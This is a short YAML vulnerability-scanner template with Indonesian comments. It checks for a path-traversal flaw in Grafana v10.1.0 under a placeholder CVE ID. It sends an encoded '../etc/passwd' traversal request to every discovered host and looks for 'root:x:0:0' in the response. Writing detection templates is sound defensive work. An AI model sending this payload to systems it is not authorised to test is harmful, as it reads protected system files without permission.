id: grafana-cve-2024-xxxxx-check
info:
  name: "Deteksi Grafana v10.1.0 yang Rentan (CVE-2024-XXXXX)"
  severity: "high"
target: "host" # Akan berjalan di semua host yang ditemukan
requests:
  - method: "GET"
    # Ini adalah endpoint yang rentan dari riset Anda
    path: "{{base_url}}/foo/bar/..%2f..%2f..%2fetc%2fpasswd"
    
    matchers_condition: "and"
    matchers:
      # 1. Pastikan responsnya sukses
      - type: "status"
        status: 200
        
      # 2. Dan pastikan kita melihat isi file /etc/passwd
      - type: "regex"
        part: "body"
        regex:
          - "root:x:0:0"